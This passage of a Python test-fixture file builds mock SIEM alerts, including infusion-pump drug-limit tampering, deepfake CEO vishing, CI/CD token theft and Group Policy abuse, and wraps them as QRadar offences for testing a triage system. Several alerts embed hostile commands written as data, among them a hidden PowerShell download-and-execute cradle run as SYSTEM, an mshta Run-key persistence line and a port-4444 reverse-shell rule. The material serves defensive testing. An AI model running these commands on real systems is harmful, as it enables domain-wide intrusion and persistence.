     "detail": "Stolen NPM_TOKEN used to publish @acmecorp/payment-sdk v3.4.1→v3.4.2 with attacker-controlled 'helper-utils-x' dependency.",
     "package": "@acmecorp/payment-sdk", "version": "3.4.2",
     "note": "Supply chain: backdoored own npm package"},
    {"sequence": 5, "timestamp": "2026-06-01T09:22:15Z", "type": "AWS_API_CALL",
     "detail": "Stolen AWS_DEPLOY_KEY: sts:GetCallerIdentity, s3:ListBuckets, lambda:ListFunctions, secretsmanager:ListSecrets",
     "source_ip": "185.220.101.34", "note": "Enumerating production AWS infra"}
  ]
}
""")

_TH = _j(r"""
{
  "source": "Claroty xDome", "event_type": "MedicalDeviceAnomaly",
  "timestamp": "2026-06-01T03:45:22Z", "severity": "Critical", "confidence": 78,
  "device": {"name": "INF-PUMP-ICU-07", "type": "Baxter Sigma Spectrum Infusion Pump",
             "firmware_version": "8.0.0", "ip": "172.16.200.107", "mac": "00:1A:2B:3C:4D:07",
             "network_zone": "Medical-ICU-VLAN", "fda_regulated": true, "patient_connected": true,
             "location": "ICU Bay 7", "last_maintenance": "2026-05-01",
             "known_vulnerabilities": ["CVE-2022-26390 (CVSS 5.5)", "CVE-2022-26392 (CVSS 5.0)"]},
  "anomaly": {"type": "UNAUTHORIZED_COMMUNICATION", "events": [
    {"timestamp": "2026-06-01T03:45:22Z", "type": "OUTBOUND_DNS",
     "detail": "Pump queried DNS for 'update.baxter-medical.net' — NOT Baxter's infra. Official: 'updates.baxter.com'.",
     "resolved_ip": "185.234.72.99"},
    {"timestamp": "2026-06-01T03:45:30Z", "type": "HTTPS_CONNECTION",
     "detail": "HTTPS to 185.234.72.99:443. Cert CN: 'update.baxter-medical.net'. Issuer: Let's Encrypt (Baxter uses DigiCert).",
     "bytes_sent": 4891, "bytes_received": 287344},
    {"timestamp": "2026-06-01T03:46:15Z", "type": "FIRMWARE_WRITE_ATTEMPT",
     "detail": "Write detected on firmware partition. Source: 185.234.72.99. Size: 287KB.",
     "write_blocked": false, "note": "Firmware update mechanism does NOT validate signatures (CVE-2022-26390)"},
    {"timestamp": "2026-06-01T03:47:00Z", "type": "CONFIGURATION_CHANGE",
     "detail": "Drug library modified. Fentanyl limit 200→2000 mcg/hr. Propofol limit 200→2000 mcg/kg/min.",
     "previous_limits": {"Fentanyl": "200 mcg/hr", "Propofol": "200 mcg/kg/min"},
     "new_limits": {"Fentanyl": "2000 mcg/hr", "Propofol": "2000 mcg/kg/min"},
     "note": "Drug safety limits 10x increased — fatal overdose possible. Highest-stakes finding."}
  ]},
  "patient_context": {"patient_connected": true,
                      "current_infusion": "Normal Saline 125 mL/hr",
                      "scheduled_medications": ["Fentanyl 50 mcg/hr (06:00)", "Propofol PRN"],
                      "note": "Patient receiving saline; Fentanyl scheduled in 2h. Unremediated pump → 10x overdose risk."}
}
""")

_TI = _j(r"""
{
  "source": "Pindrop Voice Security + Cisco Webex", "event_type": "VoicePhishingDetected",
  "timestamp": "2026-06-01T15:45:00Z", "severity": "High", "confidence": 75,
  "call_details": {"caller_id": "+1-212-555-0100", "caller_id_spoofed": true,
                   "real_source": "VoIP trunk via Twilio, registered to 'Meridian Advisory LLC', 3 days ago",
                   "called_number": "+1-415-555-0200 (ACMECORP Finance Dept)", "duration_seconds": 847,
                   "recording_available": true, "recording_path": "/recordings/2026-06-01/call_847291.wav"},
  "voice_analysis": {"deepfake_probability": 94,
                     "voice_match": {"claimed_identity": "James Morrison (CEO)", "voice_profile_match": 89,
                                     "note": "Close match to CEO voice profile from earnings calls. AI synthesis artifacts: unnatural formant transitions at 2.3kHz, missing micromodulations 50-200Hz, suspiciously consistent pitch variance."},
                     "speech_patterns": {"urgency_indicators": 12, "authority_claims": 8, "secrecy_requests": 5,
                                         "social_engineering_score": 92,
                                         "key_phrases": ["I need this handled personally",
                                                         "Don't loop anyone else in — this is board-level confidential",
                                                         "I'm traveling and can't access my email",
                                                         "Process the wire today — the deal closes at midnight",
                                                         "I'll send you the details from my personal email"]}},
  "call_content_summary": "Caller impersonating CEO James Morrison requested urgent wire $892,000 to 'Meridian Advisory LLC'. Confirmation to personal email jmorrison.exec@gmail.com. Caller had detailed knowledge of acquisition discussions and named board members.",
  "correlation": {"related_email": "BEC email from james.morrison@acmecorp.co 1.5h earlier (TEST F) targeting same wire",
                  "note": "Multi-channel attack: BEC email + deepfake voice. Voice references the email."}
}
""")

_TJ = _j(r"""
{
  "source": "Microsoft Defender for Identity", "event_type": "GroupPolicyAbuse",
  "timestamp": "2026-06-01T01:15:00Z", "severity": "Critical", "confidence": 87,
  "alert": {"name": "Malicious Group Policy Object Modification",
            "description": "Unauthorized GPO created and linked to domain root — deploys scheduled task to all domain-joined computers"},
  "actor": {"username": "ACMECORP\\svc-sccm", "display_name": "SCCM Service Account",
            "source_ip": "10.10.22.94", "source_hostname": "DEV-WS-0194",
            "note": "svc-sccm should only modify GPOs from SCCM server (10.10.3.50), not dev workstation. Compromised."},
  "gpo_details": {"gpo_name": "Windows Update Configuration - Security Baseline v4.2",
                  "gpo_guid": "{6AC1786C-016F-11D2-945F-00C04FB984F9}",
                  "created": "2026-06-01T01:15:00Z", "linked_to": "DC=acmecorp,DC=local",
                  "link_enforced": true,
                  "note": "Linked to domain root with enforcement → applies to ALL 312 domain-joined computers"},
  "gpo_contents": {
    "scheduled_task": {"name": "WindowsUpdateHealthCheck", "trigger": "AtLogon + Daily 02:00",
                       "action": "powershell.exe -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.22.94:8080/health')\"",
                       "run_as": "SYSTEM",
                       "note": "Runs as SYSTEM every logon + daily 2am. Downloads PowerShell from compromised dev box."},
    "registry_modification": {"key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                              "value_name": "SecurityHealthService",
                              "value_data": "C:\\Windows\\System32\\mshta.exe http://10.10.22.94:8080/update.hta",
                              "note": "Persistence via Run key with mshta.exe (LOLBin)"},
    "firewall_rule": {"name": "Windows Update Service (Inbound)", "direction": "Inbound",
                      "port": "4444", "action": "Allow",
                      "note": "Opens port 4444 — Metasploit/reverse shell default"}
  },
  "impact": {"affected_computers": 312, "execution_window": "Next logon or 02:00 UTC",
             "time_to_impact": "~45 minutes (next logon cycle)",
             "note": "Domain-wide within one logon cycle: scheduled task as SYSTEM + Run key + port 4444 inbound on all 312 computers."}
}
""")


# ── Scenario registry: (offence_id, scenario_label, raw_alert) ────


SCENARIOS: list[tuple[int, str, str, dict]] = [
    # offence_id, scenario_id, step_label, raw_alert_dict
    (SCENARIO_ID_BASE + 11, "S1", "1/5 LotL Supply Chain — Proofpoint (clean email)", _S1_A1),
    (SCENARIO_ID_BASE + 12, "S1", "2/5 LotL Supply Chain — Defender (signed download)", _S1_A2),
    (SCENARIO_ID_BASE + 13, "S1", "3/5 LotL Supply Chain — CrowdStrike (DLL side-load + persist)", _S1_A3),
    (SCENARIO_ID_BASE + 14, "S1", "4/5 LotL Supply Chain — Defender (LOLBin recon + certutil exfil)", _S1_A4),
    (SCENARIO_ID_BASE + 15, "S1", "5/5 LotL Supply Chain — Zscaler (Notion API steg-exfil)", _S1_A5),
    (SCENARIO_ID_BASE + 21, "S2", "Identity Attack Chain — MFA fatigue→PRT theft→OAuth+forward+admin", _S2),
    (SCENARIO_ID_BASE + 31, "S3", "UEFI Firmware Bootkit (BlackLotus-class)", _S3),
    (SCENARIO_ID_BASE + 41, "S4", "Insider — Steganographic ML-model exfiltration", _S4),
    # v2 advanced test payloads (2026-06-01) — TEST A through J, offence IDs 90061-90070
    (SCENARIO_ID_BASE + 61, "TEST-A", "Golden Ticket — Kerberos persistence (T1558.001)", _TA),
    (SCENARIO_ID_BASE + 62, "TEST-B", "Exchange ProxyShell — webshell + backdoor user (CVE-2021-34473)", _TB),
    (SCENARIO_ID_BASE + 63, "TEST-C", "DNS tunneling — dnscat2 exfiltration 12.4MB (T1048.003)", _TC),
    (SCENARIO_ID_BASE + 64, "TEST-D", "SIM swap → MFA bypass → Okta/AWS admin (T1111+T1098)", _TD),
    (SCENARIO_ID_BASE + 65, "TEST-E", "Linux LKM rootkit — syscall hooks + SSH key persistence (T1014)", _TE),
    (SCENARIO_ID_BASE + 66, "TEST-F", "BEC CEO wire fraud — .CO TLD + Gmail reply-to (no IOCs)", _TF),
    (SCENARIO_ID_BASE + 67, "TEST-G", "CI/CD compromise — GitHub Actions secret exfil + supply chain", _TG),
    (SCENARIO_ID_BASE + 68, "TEST-H", "Medical infusion pump — drug limits 10x↑, patient at risk (CVE-2022-26390)", _TH),
    (SCENARIO_ID_BASE + 69, "TEST-I", "Deepfake vishing — AI-synth CEO voice + BEC multi-channel", _TI),
    (SCENARIO_ID_BASE + 70, "TEST-J", "GPO abuse — domain-wide scheduled-task + persistence (T1484.001)", _TJ),
    (SCENARIO_ID_BASE + 51, "S5", "1/4 Zero-Day Chain — WAF blocked SSTI probe", _S5_A1),
    (SCENARIO_ID_BASE + 52, "S5", "2/4 Zero-Day Chain — WAF-bypassed SSTI success", _S5_A2),
    (SCENARIO_ID_BASE + 53, "S5", "3/4 Zero-Day Chain — webshell + XMRig + crontab persist", _S5_A3),
    (SCENARIO_ID_BASE + 54, "S5", "4/4 Zero-Day Chain — CloudWatch CPU spike + $847/day cost", _S5_A4),
]


_SEVERITY_NAME_TO_NUM = {
    "Critical": 9, "High": 7, "Medium": 5, "Low": 3, "Informational": 1,
}


def _wrap_as_qradar_offence(
    offence_id: int, scenario_id: str, step_label: str, raw: dict,
) -> dict:
    """Wrap a sophisticated alert as a QRadar offence shape.

    Preserves the FULL raw alert in ``_raw_alert`` so SARA's downstream
    agents (analysis_summary, classification) can read the complete
    narrative. Description = scenario label + source + first-line summary.
    Severity numeric from raw severity_name; start_time = source timestamp
    parsed to ms epoch.

    Same field shape as ``_build_qradar_offense`` (real QRadar API),
    so action 1456 / 636's script consumes it byte-identically.
    """
    sev_name = raw.get("severity") or "Medium"
    sev_num = _SEVERITY_NAME_TO_NUM.get(sev_name, 5)
    source = raw.get("source", "unknown")
    ts_iso = (
        raw.get("timestamp")
        or (raw.get("timestamp_range", "") or "").split(" to ")[0]
        or "2026-05-22T00:00:00Z"
    )
    try:
        # Convert ISO to ms epoch
        from datetime import datetime
        dt = datetime.fromisoformat(ts_iso.replace("Z", "+00:00"))
        start_ms = int(dt.timestamp() * 1000)
    except Exception:
        start_ms = 1748000000000  # fallback ~ 2025-05-23

    # Build description: scenario tag + source + first impactful field
    summary_bits = [f"[{scenario_id} — {step_label}]", f"Source: {source}"]
    for k in ("alert", "detection", "anomaly", "risk_policy", "event_type"):
        v = raw.get(k)
        if isinstance(v, dict):
            for kk in ("name", "type", "description"):
                if v.get(kk):
                    summary_bits.append(str(v[kk])[:200])
                    break
            break
        elif isinstance(v, str) and v:
            summary_bits.append(v[:200])
            break
    description = " | ".join(summary_bits)[:1024]

    return {
        # Raw QRadar fields (script reads a['id'], a['start_time'], a['magnitude'])
        "id": offence_id,
        "offense_id": offence_id,
        "description": description,
        "offense_source": source,
        "source_ip": _extract_ip(raw),
        "destination_ip": "",
        "severity": sev_num,
        "magnitude": sev_num,
        "credibility": raw.get("confidence", 50) // 10 if isinstance(raw.get("confidence"), int) else 6,
        "relevance": 8,
        "status": "OPEN",
        "categories": [scenario_id, "Sophisticated-Test"],
        "category_count": 2,
        "security_category_count": 2,
        "policy_category_count": 0,
        "rules": [{"type": "SARA_SCENARIO_TEST", "id": offence_id}],
        "start_time": start_ms,
        "start_epochtime": start_ms,
        "first_persisted_time": start_ms,
        "last_persisted_time": start_ms + 60000,
        "last_updated_time": start_ms + 30000,
        "event_count": 1,
        "flow_count": 0,
        "source_count": 1,
        "username_count": 1,
        "device_count": 1,
        "destination_port": "",
        "source_port": "",
        "log_sources": [{
            "type_name": "SARA-Scenario-Mock", "id": 999,
            "name": f"SARA Scenario {scenario_id} mock source",
            "type_id": 999,
        }],
        "remote_destination_count": 0,
        "local_destination_count": 1,
        "destination_networks": ["other"],
        "source_network": "Scenario-Mock-Net",
        "domain_id": 1,
        "domain_name": "REWTERZ",
        "assigned_to": None,
        "closing_user": None,
        "closing_reason_id": None,
        "close_time": None,
        "inactive": False,
        "protected": False,
        "follow_up": False,
        "offense_type": 0,
        "source_address_ids": [offence_id],
        "local_destination_address_ids": [],
        # Full raw alert preserved for SARA's downstream agents
        "_raw_alert": raw,
        "_scenario_id": scenario_id,
        "_scenario_step": step_label,
        "x-mock-source": MOCK_SOURCE,
    }


def _extract_ip(raw: dict) -> str:
    """Best-effort IP extraction from arbitrary alert shapes."""
    for path in (
        ("source_ip",),
        ("request", "source_ip"),
        ("device", "ip"),
        ("host", "ip"),
        ("transaction", "device"),
    ):
        cur: Any = raw
        try:
            for k in path:
                cur = cur[k]
            if isinstance(cur, str) and cur:
                return cur
        except (KeyError, TypeError):
            continue
    return ""


def all_scenarios_as_qradar() -> list[dict]:
    """Return all 12 scenario alerts wrapped as QRadar offences."""
    return [
        _wrap_as_qradar_offence(oid, sid, label, raw)
        for (oid, sid, label, raw) in SCENARIOS
    ]
